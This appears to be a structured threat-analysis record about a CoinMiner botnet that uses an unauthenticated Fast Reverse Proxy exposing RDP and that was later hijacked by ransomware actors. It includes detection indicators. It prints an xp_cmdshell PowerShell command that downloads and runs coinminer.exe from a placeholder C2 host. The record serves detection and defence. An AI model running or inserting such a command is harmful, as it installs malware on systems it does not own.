package_info.package_manager: custom/standalone (not from a public package manager)
package_info.why_malicious: The proxy server software was modified and deployed by a CoinMiner threat actor to control an infected botnet, enabling unauthorized remote access and lateral movement. Its exposure and lack of access controls allowed further compromise by ransomware actors, demonstrating its use as malicious infrastructure.

execution_context.file_location: Modified Fast Reverse Proxy server binary/configuration

malicious_snippets.code_snippet: Custom Fast Reverse Proxy configuration with exposed RDP port and no login restrictions, enabling remote access to internal botnet systems.
malicious_snippets.code_language: configuration (proxy server, likely Go or shell for deployment)
malicious_snippets.code_behavior: At runtime, the proxy server listens on an exposed RDP port without authentication, forwarding incoming connections to internal botnet hosts, enabling remote access and lateral movement.

malice_analysis.why_suspicious: Exposing RDP ports without authentication is highly abnormal and dangerous, as it allows any remote actor to access internal systems.
malice_analysis.violated_expectations: A legitimate proxy server should restrict access, require authentication, and not expose sensitive services like RDP to the public internet.
malice_analysis.similar_legitimate_use: Penetration testing environments may temporarily expose services for testing, but never in production or without access controls.

malicious_snippets.code_snippet: EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://C2_SERVER/coinminer.exe -OutFile C:\Windows\Temp\coinminer.exe; Start-Process C:\Windows\Temp\coinminer.exe"';
malicious_snippets.code_behavior: At runtime, after gaining access to MS-SQL with admin privileges, the attacker uses xp_cmdshell to download and execute CoinMiner malware from a C2 server, establishing persistence and C2 communication.

malice_analysis.why_suspicious: Using xp_cmdshell to download and execute remote binaries is a classic malware delivery technique and is never part of normal database operations.
malice_analysis.violated_expectations: MS-SQL servers should not be used to execute arbitrary remote code or download malware.
malice_analysis.similar_legitimate_use: System administrators may use xp_cmdshell for legitimate maintenance, but never to fetch and run untrusted binaries.

attack_chain.action: Attacker scans for MS-SQL servers with weak 'sa' credentials and gains admin access.
Attacker uses xp_cmdshell to download and execute CoinMiner malware from a C2 server.
attack_chain.leads_to: Establishment of botnet and C2 infrastructure

attack_chain.action: CoinMiner group deploys a modified Fast Reverse Proxy server to control infected bots, exposing RDP port without authentication.
attack_chain.leads_to: Proxy server becomes exposed to the internet

attack_chain.action: Ransomware actor scans for exposed RDP ports, discovers the proxy server, and gains admin access due to lack of restrictions.
Ransomware actor moves laterally through the botnet and deploys ransomware across the network.

behavioral_signatures: Proxy servers exposing RDP or other sensitive ports without authentication
MS-SQL servers executing xp_cmdshell to download and run remote binaries
Unusual lateral movement originating from proxy infrastructure
file_indicators: Unusual proxy server configuration files allowing unrestricted access
network_indicators: Outbound connections to known CoinMiner C2 domains/IPs
Inbound RDP connections from untrusted sources
Proxy server forwarding traffic to internal botnet hosts
detection_knowledge.how_to_detect: Monitor for proxy servers exposing RDP or other sensitive services without authentication, especially those forwarding traffic to internal hosts. Alert on MS-SQL servers invoking xp_cmdshell to download and execute remote binaries. Look for new or modified proxy server binaries/configurations and coinminer.exe in temporary directories. Correlate unusual RDP access patterns with lateral movement and ransomware deployment.
